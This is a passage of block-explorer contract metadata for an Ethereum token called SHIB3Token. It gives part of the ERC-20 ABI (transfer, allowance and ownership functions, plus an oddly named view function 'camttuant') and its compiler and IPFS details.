e\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"acawjurdt\",\"type\":\"address\"}],\"name\":\"camttuant\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amttuant\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amttuant\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SHIB3Token", "CompilerVersion": "v0.8.3+commit.8d00100c", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://957e5ef9e5feba4ccdf6fb365ecba3bb15205120d2d3a618487a57db215b00dd"}